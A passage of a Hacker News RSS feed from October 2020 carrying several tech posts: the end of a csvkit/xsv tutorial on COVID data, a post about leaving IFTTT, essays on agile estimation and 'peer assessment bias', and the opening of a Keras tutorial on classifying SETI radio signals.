</pre></div><p>As you can see, using <strong>csvcut </strong>with the option <strong>-n </strong>can list all the headers we have with their associated order which can help us select some specific columns that we're interested in.</p><h2>Selecting specific columns</h2><p>In this tutorial, we're interested in four columns and these are their descriptions as reported by the COVID&nbsp;Tracking&nbsp;Project:</p><ol start="1" role="list"><li>data:&nbsp;Date on which data was collected by The COVID Tracking Project.</li><li>state: Two-letter abbreviation for the state or territory.</li><li>positive: Total number of <strong>confirmed plus probable cases</strong> of COVID-19 reported by the state or territory</li><li>death:&nbsp;Total <strong>fatalities with confirmed OR probable COVID-19 case diagnosis</strong><br></li></ol><p>Let's see how we can get the first 10 lines of these 4 columns in our CSV&nbsp;file at the command line:</p><div><pre>$ csvcut -c date,state,positive,death all-states-history.csv | head | csvlook 
|       date | state | positive |  death |
| ---------- | ----- | -------- | ------ |
| 2020-10-26 | AK    |   14,413 |     68 |
| 2020-10-26 | AL    |  185,322 |  2,866 |
| 2020-10-26 | AR    |  106,727 |  1,833 |
| 2020-10-26 | AS    |        0 |      0 |
| 2020-10-26 | AZ    |  238,964 |  5,875 |
| 2020-10-26 | CA    |  901,010 | 17,357 |
| 2020-10-26 | CO    |   95,089 |  2,076 |
| 2020-10-26 | CT    |   68,099 |  4,589 |
| 2020-10-26 | DC    |   16,812 |    642 |
</pre></div><p>So <strong>csvcut </strong>with the option <strong>-c </strong>is used here to select the upcoming columns separated by commas. These 10 lines look better aligned with <strong>csvlook</strong></p><p>Note that we could've done that with either of the following commands:</p><div><pre>$ csvcut -c 1,2,22,4 all-states-history.csv | csvgrep -c state -m CA |head | csvlook
$ csvcut -c 1-2,22,4 all-states-history.csv | csvgrep -c state -m CA |head | csvlook
$ csvcut -c 1-2,positive,4 all-states-history.csv | csvgrep -c state -m CA |head | csvlook
</pre></div><p>Meaning you can select the columns with their numbers or ranges or a combination of numbers and column names as strings.</p><p>Take care that this CSV&nbsp;data may differ from yours if you're using the recent data from the COVID&nbsp;Tracking Project on another day than the day this tutorial was written.</p><h2>Filtering information</h2><p>Let's now filter out COVID&nbsp;data at California state:</p><div><pre>$ csvcut -c date,state,positive,death all-states-history.csv | csvgrep -c state -m AL | head | csvlook 
|       date | state | positive | death |
| ---------- | ----- | -------- | ----- |
| 2020-10-26 | AL    |  185,322 | 2,866 |
| 2020-10-25 | AL    |  184,355 | 2,866 |
| 2020-10-24 | AL    |  183,276 | 2,866 |
| 2020-10-23 | AL    |  180,916 | 2,859 |
| 2020-10-22 | AL    |  177,064 | 2,843 |
| 2020-10-21 | AL    |  174,528 | 2,805 |
| 2020-10-20 | AL    |  174,528 | 2,805 |
| 2020-10-19 | AL    |  173,485 | 2,789 |
| 2020-10-18 | AL    |  172,626 | 2,788 |
</pre></div><p>We used here <strong>csvgrep</strong> with the option <strong>-c </strong>to select the column that we’re filtering which is the <em>state </em>here to match <em>AL</em> using <strong>-m </strong>option that matches the pattern we search for.</p><p>I'd like to make sure of this data, so I&nbsp;went to Google and asked how many cases we have at Alabama and this is the answer:</p><figure><p><img src="https://uploads-ssl.webflow.com/5f359c073455c743bc873ee4/5f988fc5968f41509e41fbfe_Screen%20Shot%202020-10-27%20at%2011.22.07%20PM.png" loading="lazy" alt=""></p><figcaption>Image by the Author</figcaption></figure><p>Looks like the data reported by the COVID Tracking Project is close to what Google is reporting having 186K positive cases and 2892 fatalities.</p><p>If you also put another column to show the increase in the positive cases from the previous day, you'd find:</p><div><pre>$ csvcut -c date,state,positive,24,death all-states-history.csv | csvgrep -c state -m AL | head | csvlook
|       date | state | positive | positiveIncrease | death |
| ---------- | ----- | -------- | ---------------- | ----- |
| 2020-10-26 | AL    |  185,322 |              967 | 2,866 |
| 2020-10-25 | AL    |  184,355 |            1,079 | 2,866 |
| 2020-10-24 | AL    |  183,276 |            2,360 | 2,866 |
| 2020-10-23 | AL    |  180,916 |            3,852 | 2,859 |
| 2020-10-22 | AL    |  177,064 |            2,536 | 2,843 |
| 2020-10-21 | AL    |  174,528 |                0 | 2,805 |
| 2020-10-20 | AL    |  174,528 |            1,043 | 2,805 |
| 2020-10-19 | AL    |  173,485 |              859 | 2,789 |
| 2020-10-18 | AL    |  172,626 |              964 | 2,788 |
</pre></div><p>967 positive cases increased from Oct. 26 to Oct. 27 and this number exactly matches what Google reports (+967)&nbsp;below the Total cases number in the image above.</p><h2>Joining two CSVs</h2><p>I'm not familiar with some abbreviations in the state column, so let's have the second CSV file which we can join on to get a cleaner output of CSV data we understand. Let's download it using <em>curl:</em></p><div><pre>$ curl -LO https://gist.githubusercontent.com/afomi/8824ddb02a68cf15151a804d4d0dc3b7/raw/5f1cfabf2e65c5661a9ed12af27953ae4032b136/states.csv
</pre></div><p>This <strong>states.csv</strong><em> </em>file has two columns:&nbsp;<em>State</em> and <em>Abbreviation</em></p><p>Let's see how we can make this interesting join here:</p><div><pre>$ csvjoin -c Abbreviation,state states.csv all-states-history.csv | csvcut -c date,State,Abbreviation,positive,death | head | csvlook 
|       date | State   | Abbreviation | positive | death |
| ---------- | ------- | ------------ | -------- | ----- |
| 2020-10-26 | ALABAMA | AL           |  185,322 | 2,866 |
| 2020-10-25 | ALABAMA | AL           |  184,355 | 2,866 |
| 2020-10-24 | ALABAMA | AL           |  183,276 | 2,866 |
| 2020-10-23 | ALABAMA | AL           |  180,916 | 2,859 |
| 2020-10-22 | ALABAMA | AL           |  177,064 | 2,843 |
| 2020-10-21 | ALABAMA | AL           |  174,528 | 2,805 |
| 2020-10-20 | ALABAMA | AL           |  174,528 | 2,805 |
| 2020-10-19 | ALABAMA | AL           |  173,485 | 2,789 |
| 2020-10-18 | ALABAMA | AL           |  172,626 | 2,788 |
</pre></div><p>Note here that <strong>csvjoin </strong>command takes much time because it's reading both files into memory.</p><p>Here we joined the two CSV files on a column for each CSV; <em>Abbreviation</em> in the first file and <em>state </em>in the second one and then we filtered out 5 columns to view using <strong>csvcut -c </strong></p><p>Also, note that there the second column you filtered out when you joined is gone meaning if you filtered out <em>state (</em>which was the column that has the two-letter abbreviation of the state) it will give an error that 'state' is invalid which means this column is not there anymore.</p><h2>Comparing between xsv and csvkit utilities</h2><p>As we noticed, some commands took much time using csvkit command line utility. Let's see a quick comparison between its command-line tools and their associated ones at xsv.</p><p>All the upcoming commands run are relative to my machine, let's compare one by another:</p><h3>xsv headers vs csvcut -n</h3><div><pre>$ time csvcut -n all-states-history.csv | head
  1: date
  2: state
  3: dataQualityGrade
  4: death
  5: deathConfirmed
  6: deathIncrease
  7: deathProbable
  8: hospitalized
  9: hospitalizedCumulative
 10: hospitalizedCurrently

real	0m0.307s
user	0m0.224s
sys	0m0.077s
</pre></div><p>Time of csvkit's <strong>csvcut -n</strong>: ~307ms </p><div><pre>$ time xsv headers all-states-history.csv | head
1   date
2   state
3   dataQualityGrade
4   death
5   deathConfirmed
6   deathIncrease
7   deathProbable
8   hospitalized
9   hospitalizedCumulative
10  hospitalizedCurrently

real	0m0.013s
user	0m0.008s
sys	0m0.007s
</pre></div><p>Time of xsv's <strong>headers</strong>:&nbsp;~13ms</p><h3>xsv select vs csvcut -c</h3><div><pre>$ time csvcut -c date,state,positive,death all-states-history.csv | head
date,state,positive,death
2020-10-26,AK,14413,68
2020-10-26,AL,185322,2866
2020-10-26,AR,106727,1833
2020-10-26,AS,0,0
2020-10-26,AZ,238964,5875
2020-10-26,CA,901010,17357
2020-10-26,CO,95089,2076
2020-10-26,CT,68099,4589
2020-10-26,DC,16812,642

real	0m0.288s
user	0m0.209s
sys	0m0.073s
</pre></div><p>Time of csvkit's <strong>csvcut -c</strong>: ~288ms</p><div><pre>$ time xsv select date,state,positive,death all-states-history.csv | head
date,state,positive,death
2020-10-26,AK,14413,68</pre></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.ezzeddinabdullah.com/posts/how-to-clean-csv-data-at-the-command-line">https://www.ezzeddinabdullah.com/posts/how-to-clean-csv-data-at-the-command-line</a></em></p>]]>
            </description>
            <link>https://www.ezzeddinabdullah.com/posts/how-to-clean-csv-data-at-the-command-line</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943696</guid>
            <pubDate>Fri, 30 Oct 2020 16:08:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Goodbye IFTTT]]>
            </title>
            <description>
<![CDATA[
Score 347 | Comments 152 (<a href="https://news.ycombinator.com/item?id=24943685">thread link</a>) | @todsacerdoti
<br/>
October 30, 2020 | https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/ | <a href="https://web.archive.org/web/*/https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>I was a power user of <a href="https://ifttt.com/">IFTTT</a> for many years, so I had mixed
feelings recently about <a href="https://archive.is/zpx2r">their decision</a> to change
their pricing model. Under IFTTT's new pricing, you can only have 3 “custom”
actions created/enabled at any time – which is quite a downgrade from the
current unlimited free plan. On the one hand, I'm glad to see IFTTT take
necessary steps to ensure it has long-term financial stability, but on the other
hand, I don't personally get enough value from their service anymore to justify
a recurring cost. (The plan will likely be
$4/month<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, but if you sign up before a deadline, you
can lock in a price as low as $2/month)</p>
<p>IFTTT was an awesome and uniquely easy-to-use service when it first came out,
but now there are better options for personal automation for people like me, who
like to tinker with this sort of thing. Systems like
<a href="https://nodered.org/">node-red</a> and iOS shortcuts can be self hosted or run on
device, and they provide more sophisticated logic for workflows than IFTTT.</p>
<p>I stayed on IFTTT this long mostly due to inertia, and it's fantastically long
list of supported services. If I needed to throw together a quick
spreadsheet-recording automation, or cron-like trigger, IFTTT was a great
starting place. However, it does have limitations. Until now (though it seems
like this might change with their premium offering), IFTTT basically only did
what its name implied: “if this, then that”. No “if X then Y else Z”, no “if X
and Z then Y”, etc. Often times, you don't need any complicated logic or
filtering, but it was frustrating that there wasn't the option for more advanced
automation. Ultimately, IFTTT had a great “on-ramp”, but once you were on board
with their system, you realize how shallow it is. Excellent breadth, mediocre
depth.</p>
<p>Similarly, in the past couple years IFTTT's UI has leaned heavily into the
“applet” metaphor, with these big goofy toggle switches to enable/disable
automations. The site also transitioned towards a focus on community- (or, more
often corporate-) created automations, at the expense of the experience for
creating your own applets. Like seriously, why is 30% of the UI for an applet
<em>details page</em> (!) taken up by the connection status toggle?</p>
<figure>
    
    <a href="https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/ifttt.png">
        
            
                
                
            
        
        <img src="https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/ifttt_hu1a43e8a517283105e03bcbb0c4894a01_37903_0x300_resize_lanczos_2.png" loading="lazy"> 
        </a>
</figure>

<p>The settings page, too, is woefully information sparse. As a user, this makes me
feel that desktop-usability was not high on IFTTT's design priorities. You have
to scroll the page to begin to start to see what the automation is doing:</p>
<figure>
    
    <a href="https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/ifttt-settings.png">
        
            
                
                
            
        
        <img src="https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/ifttt-settings_hub4acc09d90c5c0c4cbf3054a07fa3040_91989_0x400_resize_lanczos_2.png" loading="lazy"> 
        </a>
</figure>

<p>Eventually, the UI got to the point where it felt like using
<a href="https://en.wikipedia.org/wiki/Lego_Duplo">Duplos</a> or something. It didn't have
to be this way! There are great low-to-no-code tools that have much more usable
interfaces, like
<a href="https://en.wikipedia.org/wiki/Scratch_(programming_language)">Scratch</a>.</p>
<figure>
    
    <a href="https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/scratch.png">
        
            
        
        <img src="https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/scratch.png" loading="lazy"> 
        </a>
</figure>

<p>So, I decided to migrate away, since the move to premium was already going to
substantially limit what I could do with IFTTT. In going through my catalog of
IFTTT “applets”, I identified 3 main patterns of automations that I used IFTTT
for: (1) triggering an action to happen at a specific time, (2) triggering an
action to happen in response to a location change (i.e. geofencing), or (3)
triggering an action to happen in response to an event in a web service.</p>
<p>Of these 3 buckets, iOS shortcuts readily handles the first 2: as of iOS 14,
Shortcuts can be triggered in the background at a specific time of day, or in
response to entering/leaving a geofence. Shortcuts also has a much more
sophisticated integration with iOS than any of IFTTT's apps, so more exciting
mobile automation becomes possible – for example, setting my phone to Low Power
Mode once the battery drops below a certain threshold. Of course, you are
restricted to apps/services that support Shortcuts, and the number of supported
services is considerably smaller than IFTTT.</p>
<p>Node-red handles buckets 1 and 3: it has good support for time-based actions,
and can receive webhooks to respond to events from external services. It also
has a great plugin ecosystem, so it's support begins to rival IFTTT's impressive
selection of supported services. Additionally, node-red has many “escape
hatches” that IFTTT does not: you can use it to make raw HTTP requests and write
your own plugins/logic in Javascript, allowing for much more complex automation.</p>
<p>Neither node-red nor iOS shortcuts are as easy to use as IFTTT for putting
together a simple automation, which is a shame. However, between them (and other
alternative automation frameworks that I've trialed, like <a href="https://n8n.io/">n8n</a>
and <a href="https://github.com/huginn/huginn">huginn</a>), I've more than covered my
personal automation needs.</p>
<p>And so, goodbye IFTTT! ðŸ‘‹ I'm not put off by them charging for their service; I
think charging for software is a good thing! It's just that this was the nudge I
needed to move my automations to infrastructure that I have more control over,
which has other benefits outside the scope of this article. I'm thankful that a
service like IFTTT continues to exist; I still think it's a fantastic tool to
“on-ramp” less technical folks into automation and no-code tools.</p>
<p><em>Cover art:
<a href="https://artvee.com/dl/the-village-of-murnau/">The Village Of Murnau (1908)</a></em></p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>A previous version of this article stated that the price for IFTTT Pro was
$10/month. While the original press release, as covered <a href="https://www.theverge.com/2020/9/10/21430265/ifttt-pro-subscriptions-free-controversy">here</a> indicated a $10/month
price, and the current suggested price for IFTTT Pro on their signup form is
$10/month, it seems like going forward the Pro price will be $4/month. I
apologize for the inaccuracy. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</section>

        </div></div>]]>
            </description>
            <link>https://benjamincongdon.me/blog/2020/10/30/Goodbye-IFTTT/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943685</guid>
            <pubDate>Fri, 30 Oct 2020 16:07:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[About Agile Project Estimation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24943644">thread link</a>) | @smartinez87
<br/>
October 30, 2020 | https://www.wyeworks.com/blog/2020/10/30/about-agile-estimation/ | <a href="https://web.archive.org/web/*/https://www.wyeworks.com/blog/2020/10/30/about-agile-estimation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><header><nav></nav></header><div><p><img src="https://www.wyeworks.com/images/about-agile-estimation.jpg" alt=""></p><div><p><img src="https://www.wyeworks.com/images/blog-article-pattern1.png" alt=""></p><p><img src="https://www.wyeworks.com/images/blog-article-pattern2.png" alt=""></p></div><div><div><h3>About agile project estimation</h3><div><p><img src="https://www.wyeworks.com/images/team/andres-vidal.jpg" alt=""></p><p>Oct 30, 2020</p><p>7 min read</p></div></div></div></div><section><div><p>Software development is, in essence, an industrial process like any other. But an immature one, not only because of the industry’s young age, but also because of the product’s inherent complexity. Software is intangible, physically unbounded (virtually) and in continuous evolution. This makes defining what the product must accomplish — the so called requirements engineering — a task as difficult or arguably even more complicated than building the product itself. Software development is, therefore, an ad-hoc creative process that struggles to incorporate common features from other industrial processes, such as task automation or reutilization, out of the box.</p>
<div>
  
  <p>
    These characteristics make software project management a specially challenging duty, and explain the failure of traditional models, such as waterfall development, that are common in other business areas. Several approaches to software project management have been proposed to address this challenge, with emphasis on the widely adopted iterative processes. Agile methodologies are a set of development and process management practices that fit in this class and promise sustainable, flexible development processes, with fast return on value and high quality results. Even further, agile methodologies are a novel approach to deal with uncertainty and, as so, do not exclude planning, but rather rethink it.
  </p></div>
<h2>Why do we estimate? And what exactly?</h2>
<p>Traditional management frameworks — iterative or not — rely firmly on estimation techniques to assess project features, such as cost and duration, and plan accordingly. However, the generation of statistically accurate estimates is a costly task for the sake of planning. Agile methodologies, on the other hand, are averse to anticipation, tend to lighten the management burden and avoid incorporating activities without short-term value return. Therefore, a critical view over estimation is necessary and should turn up naturally.</p>
<p>While planning a project, the size of the workload and the amount of effort required to do it are probably the most valuable management metrics that one would like to estimate. The idea of size is related to the project’s scope, and the concept of effort could be conceived as an adjusted size, taking into account the development team’s expertise. Other estimates important to clients, such as cost and duration, can be calculated from the estimated effort or size. The essential difference between these metrics is their objectiveness: while the size is clearly visible in the final product — as function points, number of features or lines of code; the effort includes research and other support tasks necessary to complete the work.</p>
<p>As the team-dependent component of effort must be included in the planning, size and effort are often used interchangeably. This is valid, as long as the relationship between them is bound to the team as a whole and not to an individual developer’s productivity. The reason behind this is that a compromise must be made between the team members so the effort necessary to build a specific product varies among teams, instead of individuals. Otherwise, it wouldn’t be possible to elaborate sensible team-wide plans.</p>
<h2>How do we estimate?</h2>
<p>The common procedure to estimating a project’s workload is through a divide and conquer strategy. The workload is divided into smaller work units whose size is easier to estimate. In agile projects, these sizable units are often called <em>user stories</em>, and the actual metric is the effort required to complete the functionality described in the story according to a <em>definition of done</em> agreed by the team members. The measure of size can be quantitative — numerical — or qualitative — categorical. Examples of quantitative measures are expected time and <em>story points</em>.</p>
<div>
  
  <p>
    Expected time is usually measured in ideal periods — like hours or days of full and uninterrupted productivity. Effort estimation through expected time is often unadvised, as it establishes an absolute size reference (one ideal period) that is subjective by definition. To achieve an estimate understandable throughout the team, every developer must agree on what is the meaning of the ideal period: what is full productivity? How does research and support tasks are included in this definition? Also, this kind of estimate might be seen as a deadline, pressuring developers with less expertise and relaxing those who could actually have the work done faster.
  </p></div>
<p>Story points, spread mainly by the Scrum framework, are a common measure when the work units are defined as user stories. The effort is measured with an integer of a predefined sequence, usually the Fibonacci succession (1, 2, 3, 5, 8, 13, …). The size of the smallest story is set to 1, and the other stories are sized relatively. For instance, a story of size 3 is expected to take three times more the effort required to finish the smallest one. This kind of affirmation gets less accurate as the size increases, so large story points are unadvised and indicate that the story can be broken down into smaller pieces. A common method to estimate story points for a user story is the <a href="https://en.wikipedia.org/wiki/Planning_poker">Planning Poker</a>.</p>
<p>Teams and managers can take advantage of quantitative effort measures, as other support metrics can be calculated from them. Some examples are the team’s capacity, the maximum effort achievable in a fixed amount of time; and the team’s velocity, the accomplished effort trend in the near past, which is expected to continue in the near future. Also, once a story is assigned to a developer, it might be easier to predict the time necessary to finish it according to their expertise — which is useful for daily team planning.</p>
<div>
  
  <p>
    However, there are some downsides to using this kind of measure. Numerical estimates can be understood as a commitment of effort to be accomplished and to evaluate the team’s productivity. In fact, estimation techniques used in agile are informal and tend to be overoptimistic, which makes them prone to be inaccurate and lose relevance over time. Thus, evaluating a team according to the estimates generates pressures on the developers and leads to defensive effort overestimation, in order to indirectly lower the management’s expectations.
  </p></div>
<p>In contrast, qualitative measures eliminate the risk of being used to set expectations on the development team. A common example is the “T-Shirt Size” method, which uses classic t-shirt sizes — XS, S, M, L, XL — to measure the size of a user story. The sizing is also relative, so a reference user story must be chosen to determine the other stories’ size by comparison.</p>
<h2>And if we don’t estimate at all?</h2>
<p>Some recent approaches to agile project management propose not to estimate at all. This is a consequence of the high costs of estimation, in conjunction to the biases and uncertainties inherent to software development. Supporters of the #NoEstimates movement argue that avoiding estimation allows teams to deliver more value, faster and consistently, while avoiding the common misinterpretations these artifacts have. Although there are testimonials about successful projects that purposefully don’t use estimates, the question about the feasibility of this approach in bigger projects remains unclear, as good estimates are helpful for planning in complex scenarios and are frequently a requirement from clients.</p>
<p>This change of paradigm has awakened the debate about the purpose of estimation in agile projects, when it is valuable and how to optimize this process. Opinions of professionals and academics seem to converge to a common point: management and development teams should be encouraged to review the objectives of estimates in their projects, how they should be interpreted in each context and make sure that they are used to support project planning and management, rather than team evaluation.</p>
<h2>Learn more</h2>
<ul>
<li><a href="https://info.thoughtworks.com/rs/thoughtworks2/images/twebook-perspectives-estimation_1.pdf">ThoughtWorks perspectives: How do you estimate on an Agile project?</a></li>
<li><a href="https://www.scruminc.com/wp-content/uploads/2014/05/Hyper-Productive-Metircs.pdf">Scrum Metrics for Hyperproductive Teams: How They Fly like Fighter Aircraft</a></li>
<li><a href="https://techbeacon.com/app-dev-testing/noestimates-debate-unbiased-look-origins-arguments-thought-leaders-behind-movement">The #NoEstimates debate: An unbiased look at the origins, arguments, and thought leaders behind the movement.</a></li>
</ul></div></section><section></section></div></div>]]>
            </description>
            <link>https://www.wyeworks.com/blog/2020/10/30/about-agile-estimation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943644</guid>
            <pubDate>Fri, 30 Oct 2020 16:04:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Peer Assessment Bias]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24943216">thread link</a>) | @rmulholland21
<br/>
October 30, 2020 | https://www.ryansmulholland.com/writing/peer-assessment-bias | <a href="https://web.archive.org/web/*/https://www.ryansmulholland.com/writing/peer-assessment-bias">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-63067710b8dc43d7e49b"><div><p><strong>What’s the difference between you and an expert?</strong></p><p>It’s kind of obvious, isn’t it? Television appearances, thousands of dollars, and an audience of fans that accept ideas as thought leadership.</p><p>But seriously, what even <em>is</em> an expert?</p><p>Experts are peers who’ve had their ideas catch on through hard work, exhibition of talent, or luck.</p><p>I believe that statement, but it drastically simplifies everything that’s gone into someone establishing themselves as an expert. It’s not easy to get to the place where people assume you know what you’re talking about. It takes time, effort, and passion to get there. Overnight experts only exist in viral moments, it takes real expertise to have staying power.</p><p>The experts of the pre-internet age almost always hailed from academia. Earning credentials and conducting research was the only way to prove to others that you know what the hell you’re talking about. There was a gatekeeper to every distribution vessel and no public forum where a great idea from anyone could win the day.</p><p>Now we have that forum. The internet is full of people who are trying to be experts — people who think they’re experts — and as a result, there’s a monsoon of content on any given topic. And with access to information on anything, it’s the top 1% of information that we rely on, which usually belongs to...experts.</p><p>But experts are peers, remember? Just really fancy ones.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604023959443_6131"><div><p>So why don’t we consider the ideas of our peers in the same way we adopt the ideas of established thinkers?</p><p>To you, my peers, I’d like to present Peer Assessment Bias.</p><h3><strong>Peer Assessment Bias</strong></h3><p>Peer Assessment Bias is why this essay won’t be read tens of thousands of times. It’s why your best original ideas aren’t being talked about in bestselling books. It’s why you read something that a friend wrote and thought, “hmm, that was pretty good,” but not, “press the pause button on life, I need to take notes!”</p><p><strong>Peer Assessment Bias is the natural inclination to be more skeptical of the ideas of those perceived as peers, more so than the ideas of those perceived as experts.</strong></p><p>Simply put, when it’s your friend’s idea it’s solid, but when it’s coming from Peter Thiel, it’s genius.</p><p>There’s an overlap here with another bias that you may be familiar with. Survivorship Bias.</p><p>Survivorship Bias is a cognitive error that occurs when a successful subgroup is mistaken as an <em>entire</em> group due to the visibility of the successful group and the invisibility of the unsuccessful group (<a href="https://fs.blog/2020/10/sharks-survivorship-bias/" target="_blank">link here to illustrate</a>).</p><p>As it applies here, most of the ideas we consume come from experts. This is because they’ve already defeated the gatekeeper and have been elevated to the point where their thoughts matter more than others. They’re the successful survivors.</p><p>So what’s the difference between my idea of Peer Assessment Bias and good old Survivorship Bias? And how do they overlap?</p><p>Survivorship Bias is a layer of Peer Assessment Bias, but they’re not the same.</p><p>Survivorship Bias, as it relates to assessment, would lead us to believe that the best ideas come from the people who have the largest audiences. We perceive these successful survivors as experts and give more weight to the ideas they produce, even those unrelated to why they became successful in the first place. This doesn’t explain what happens on the peer side of the equation.</p><p>Peer Assessment Bias is about how we perceive those “at the same level” as us, and it’s especially focused on those who are unestablished. “Experts” were once peers and have now moved on to an evolved state. Becoming an expert takes time, and many of the strong ideas that experts share are ideated during the time when they were an unheard of “peer.”</p><p>Peer Assessment Bias has less to do with the success of the idea and more to do with the source of it. It’s different because we may very well look a great idea straight in the face and treat it as a commoner instead of as the royalty that it is.</p><h3><strong>PAB Awareness</strong></h3><p>Why does any of this matter?</p><p>Because it’s important to recognize good ideas when you hear them.</p><p>There are two sides to Peer Assessment Bias to be aware of.</p><ol data-rte-list="default"><li><p><strong>Don’t automatically elevate ideas from experts</strong></p></li><li><p><strong>Don’t automatically dismiss ideas from peers</strong></p></li></ol><p>Experts, the people we look up to, are placed on a pedestal. They’re given status as infallible.&nbsp;</p><p>This is wrong.</p><p>Yes, the people who’ve earned their expertise are most likely to keep producing thoughts or content that’s worth consuming, but never blindly. “Because Musk said it,” is not reason enough to accept an idea.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604023959443_8762"><div><p>But you know this already, you’re a responsible human. So let’s take a look at the other side of Peer Assessment Bias, the side that doesn’t come naturally.</p><p><strong>Don’t automatically dismiss ideas from peers.</strong></p><p>Pay attention to those around you. They can have ideas that are just as strong as those who’ve already earned the world’s attention. Often it’s not perfectly polished, not precisely explained, and never published in the Washington Post, but it could be just as good.</p><p>Allow me to illustrate.</p><p>This is Ayomide:</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604023959443_10888"><div><p>Sure, he’s a doctor, so he’s a proven smart guy, but the point is that you don’t know him. Ayomide is in my writing community, <a href="https://writersblochq.com/" target="_blank">Writer’s Bloc</a>, and I’ve had the pleasure of reading some of his work in the draft phase.</p><p>In August, he wrote this essay called “<a href="https://docayomide.com/love/" target="_blank">Love Your Neighbor Doesn’t Mean What We Think</a>.” It’s excellent, you should read it. But to summarize, it comes down to this one sentence:</p><blockquote><p>“Act in your neighbor’s interest as if it was your own.”</p></blockquote><p>That’s an objectively brilliant way of reframing “love your neighbor as yourself.” It may not seem like it, but that little tweak makes things click mentally in a different way than we’re used to.</p><p>Ayomide isn’t an established personality. He’s not looked upon by thousands as a brilliant mind to be listened to or read each week.</p><p>But he has some fantastic ideas worth reading, and so do your peers.&nbsp;</p><h3><strong>Empower Your Peers</strong></h3><p>The moral of this story is to cut your peers some slack.</p><p>The path to expertise is filled with early days of thoughts sent out into an empty void and then slowly adopted by a group of early fans. Those early fans are peers, and peer fans are the most important fans you can have. A show of support, a reliable voice for feedback, or a bit of help from someone promoting your work is sometimes all you need to keep pushing on to the point where you become an expert.</p><p>I’m no scientist, but there’s no doubt we’re harsher critics of our peers than we are of others we don’t know. Does this stem from personal self-doubt (I couldn’t do that, so they couldn’t do it either), a hint of jealousy, or another psychological misplacement? Maybe. But it does happen.</p><p>We have a mental bias to keep peers as peers and experts as experts. This is a bias like any other. One worthy of acknowledging and defeating.</p><p>Cut your peers some slack. Read their work. Promote their content. Champion their ideas. Stand behind them. Encourage their efforts.</p><p>To steal from my peer Ayomide; believe in your peer’s work the same way you believe in your own.</p><p>Now, go forth and lift up your peers.</p></div></div></div>]]>
            </description>
            <link>https://www.ryansmulholland.com/writing/peer-assessment-bias</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943216</guid>
            <pubDate>Fri, 30 Oct 2020 15:25:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Classifying Radio Signals from Space Using Keras in Python]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24943079">thread link</a>) | @informerfrk
<br/>
October 30, 2020 | https://valueml.com/classifying-radio-signals-from-space-using-keras-in-python/ | <a href="https://web.archive.org/web/*/https://valueml.com/classifying-radio-signals-from-space-using-keras-in-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>



<p>Hello everyone, welcome to Classifying Radio Signals from Space using Keras in Python. In this article, you will learn about how to classify radio signal using CNN, how to display results and plot 2D spectrograms with Python in Jupyter Notebook.</p>
<p>Here, we will be using the dataset which is provided by the SETI Institute. The dataset is already normalized and divided into two directories i.e. testing and validation dataset. You can download the dataset from <a href="https://valueml.com/wp-content/uploads/2020/10/Radio-Signals-from-Space.zip">here</a>.</p>
<p>So Now let’s start working on the project.</p>
<h2>Importing Libraries</h2>
<p>First, we will import all the necessary Python libraries. Please make sure all the libraries given below are installed on your system and if not, install them using pip.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">from livelossplot.tf_keras import PlotLossesCallback
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt

import tensorflow as tf

from sklearn.metrics import confusion_matrix
from sklearn import metrics

import numpy as np
np.random.seed(42)
import warnings;warnings.simplefilter('ignore')
%matplotlib inline</pre>
<h2>Loading and Preprocessing The Data</h2>
<p>Then we will load the dataset which is in CSV format using pandas.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">train_images = pd.read_csv('dataset/train/images.csv', header=None)
train_labels = pd.read_csv('dataset/train/labels.csv', header=None)

val_images = pd.read_csv('dataset/validation/images.csv', header=None)
val_labels = pd.read_csv('dataset/validation/labels.csv', header=None)</pre>
<p>Now, let’s see the dimensions of the training and validation dataset.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">print("Training set shape:", train_images.shape, train_labels.shape)
print("Validation set shape:", val_images.shape, val_labels.shape)</pre>
<p>Output:</p>
<pre>Training set shape: (3200, 8192) (3200, 4)
Validation set shape: (800, 8192) (800, 4)</pre>
<p>So now, we will reshape the data into the desired dimensions i.e. given below.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">x_train = train_images.values.reshape(3200, 64, 128, 1)
x_val = val_images.values.reshape(800, 64, 128, 1)

y_train = train_labels.values
y_val = val_labels.values</pre>
<h2>Plotting 2D Spectrograms</h2>
